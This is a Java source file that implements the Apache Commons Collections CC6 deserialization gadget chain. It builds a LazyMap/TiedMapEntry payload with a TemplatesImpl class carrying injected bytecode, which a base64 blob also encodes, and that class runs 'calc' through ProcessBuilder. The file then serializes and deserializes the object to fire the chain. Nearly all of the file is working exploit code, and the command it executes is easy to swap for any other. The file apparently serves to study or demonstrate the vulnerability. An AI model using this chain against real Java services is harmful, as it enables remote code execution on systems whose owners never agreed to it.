package Javac;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import javassist.ClassPool;
import javassist.CtClass;

//yv66vgAAADQASgoADwArCAAsCgAFAC0IAC4HAC8KAAUAMAcAMQoABQAyBwAzCAA0CgA1ADYHADcKADgAOQcAOgcAOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTEphdmFjL2hlbGxvX3RlbXBJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA8AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAZjbGFzc3oBABFMamF2YS9sYW5nL0NsYXNzOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwcAPQEAClNvdXJjZUZpbGUBABNoZWxsb190ZW1wSW1wbC5qYXZhDAAiACMBABhqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIMAD4APwEABXN0YXJ0AQAPamF2YS9sYW5nL0NsYXNzDABAAEEBABNbTGphdmEvbGFuZy9TdHJpbmc7DABCAEMBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcARAwARQBGAQAQamF2YS9sYW5nL09iamVjdAcARwwASABJAQAUSmF2YWMvaGVsbG9fdGVtcEltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhAA4ADwAAAAAAAwABABAAEQACABIAAAA/AAAAAwAAAAGxAAAAAgATAAAABgABAAAACwAUAAAAIAADAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABAAHQACABIAAABJAAAABAAAAAGxAAAAAgATAAAABgABAAAADAAUAAAAKgAEAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiACMAAgASAAAAjwAJAAIAAAA9KrcAARICuAADTCsSBAO9AAW2AAYrBL0ABVkDEgdTtgAIBL0AB1kDBL0ACVkDEgpTU7YACwO9AAy2AA1XsQAAAAMAEwAAABIABAAAAA8ABAAQAAoAEQA8ABIAFAAAABYAAgAAAD0AFQAWAAAACgAzACQAJQABACYAAAAMAAEACgAzACQAJwABABsAAAAEAAEAKAABACkAAAACACo=
public class tempImpl_test_CC6_Lazymap_classpool
{
    public static void main(String[] args)throws Exception
    {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQASgoADwArCAAsCgAFAC0IAC4HAC8KAAUAMAcAMQoABQAyBwAzCAA0CgA1ADYHADcKADgAOQcAOgcAOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTEphdmFjL2hlbGxvX3RlbXBJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA8AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAZjbGFzc3oBABFMamF2YS9sYW5nL0NsYXNzOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwcAPQEAClNvdXJjZUZpbGUBABNoZWxsb190ZW1wSW1wbC5qYXZhDAAiACMBABhqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIMAD4APwEABXN0YXJ0AQAPamF2YS9sYW5nL0NsYXNzDABAAEEBABNbTGphdmEvbGFuZy9TdHJpbmc7DABCAEMBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcARAwARQBGAQAQamF2YS9sYW5nL09iamVjdAcARwwASABJAQAUSmF2YWMvaGVsbG9fdGVtcEltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhAA4ADwAAAAAAAwABABAAEQACABIAAAA/AAAAAwAAAAGxAAAAAgATAAAABgABAAAACwAUAAAAIAADAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABAAHQACABIAAABJAAAABAAAAAGxAAAAAgATAAAABgABAAAADAAUAAAAKgAEAAAAAQAVABYAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiACMAAgASAAAAjwAJAAIAAAA9KrcAARICuAADTCsSBAO9AAW2AAYrBL0ABVkDEgdTtgAIBL0AB1kDBL0ACVkDEgpTU7YACwO9AAy2AA1XsQAAAAMAEwAAABIABAAAAA8ABAAQAAoAEQA8ABIAFAAAABYAAgAAAD0AFQAWAAAACgAzACQAJQABACYAAAAMAAEACgAzACQAJwABABsAAAAEAAEAKAABACkAAAACACo=");
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(Javac.hello_tempImpl.class.getName());
        byte[] code = cc.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//        obj.newTransformer();
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj})
        };
        Transformer[] faketransformers=new Transformer[]{
                new ConstantTransformer(1)
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(faketransformers);
        Map innermap=new HashMap();
//        innermap.put("value", "xxxx");
        Map outermap= LazyMap.decorate(innermap,chainedTransformer);
//        outermap.put("key","xxxx");
//        Class<?> classz= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor c=classz.getDeclaredConstructor(Class.class,Map.class);
//        c.setAccessible(true);
//        InvocationHandler o=(InvocationHandler) c.newInstance(Retention.class,outermap);
//
//        Map proxymap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},o);
//        o=(InvocationHandler)c.newInstance(Retention.class,proxymap);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(outermap,"keykey");
        Map hmap=new HashMap();
        hmap.put(tiedMapEntry,"valuevalue");
        outermap.remove("keykey");
        Field f=ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformers);

        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(hmap);
        oos.close();
        System.out.println(byteArrayOutputStream);

        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        ois.readObject();
    }
    // source: bytecodes/HelloTemplateImpl.java
    public static void setFieldValue(Object obj,String name,Object value)throws Exception
    {
        Field a=TemplatesImpl.class.getDeclaredField(name);
        a.setAccessible(true);
        a.set(obj,value);
    }
}
